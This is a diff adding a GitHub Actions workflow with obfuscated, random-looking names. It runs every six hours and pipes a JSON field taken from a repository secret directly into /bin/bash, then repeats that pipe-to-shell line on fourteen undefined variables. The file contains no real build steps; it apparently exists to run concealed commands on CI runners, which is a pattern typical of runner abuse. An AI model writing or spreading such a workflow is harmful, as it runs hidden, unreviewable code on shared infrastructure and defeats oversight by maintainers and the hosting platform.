@@ -1,0 +1,32 @@
+name: weianqin6529
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: weianqin6529
+        env:
+          xp96125: ${{ secrets.xp96125 }}
+        run: |
+          echo $xp96125 | jq -r .s45192 | /bin/bash
+          echo $vxqof46541 | jq -r .dlcv7 | /bin/bash
+          echo $qwn13 | jq -r .nythj9124 | /bin/bash
+          echo $yiz49905 | jq -r .hn294 | /bin/bash
+          echo $sk70282 | jq -r .y9 | /bin/bash
+          echo $pesbj34392 | jq -r .ayb67163 | /bin/bash
+          echo $tvju3192 | jq -r .ykgw78806 | /bin/bash
+          echo $tax4 | jq -r .swe725 | /bin/bash
+          echo $nzx32 | jq -r .yd34 | /bin/bash
+          echo $b09725 | jq -r .lgoe33 | /bin/bash
+          echo $eme9 | jq -r .q7414 | /bin/bash
+          echo $d0 | jq -r .r4187 | /bin/bash
+          echo $oa559 | jq -r .grz68 | /bin/bash
+          echo $wulwd4 | jq -r .ufrq7705 | /bin/bash
+          echo $elrb09 | jq -r .ywq3739 | /bin/bash
+
